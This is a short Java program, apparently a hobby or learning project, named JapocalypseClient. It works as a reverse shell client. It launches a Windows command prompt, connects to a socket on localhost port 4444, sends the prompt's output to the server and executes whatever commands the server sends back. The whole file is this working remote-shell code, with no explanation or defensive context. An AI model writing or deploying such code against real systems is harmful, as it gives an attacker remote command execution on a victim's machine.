import java.io.*;
import java.net.Socket;
import java.util.Scanner;
import java.util.concurrent.Executor;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by sheffboom on 10/15/2017.
 */
public class JapocalypseClient {
    public static void main(String[] args) throws Exception {
        Scanner scanner = new Scanner(System.in);
        Process p = Runtime.getRuntime().exec("cmd");
        PrintWriter writeToProcess = new PrintWriter(p.getOutputStream());
        InputStreamReader readFromProcess = new InputStreamReader(p.getInputStream());

        Socket socket = new Socket("localhost",4444);
        PrintWriter writeToServer = new PrintWriter(socket.getOutputStream());
        BufferedReader readFromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        Thread.sleep(100);
		
        while(true) {
            writeToServer.print(waitForAndRead(readFromProcess));
            writeToServer.flush();
            String command = readFromServer.readLine();
            writeToProcess.println(command);
            writeToProcess.flush();
            Thread.sleep(100);
        }
    }

    public static String waitForAndRead(InputStreamReader in) throws IOException {
        StringBuilder str = new StringBuilder(64);
        while(in.ready()) {
            str.append((char)in.read());
        }
        if(str.toString().isEmpty()) {
            str.append(-1);
        }

        return str.toString();
    }
}


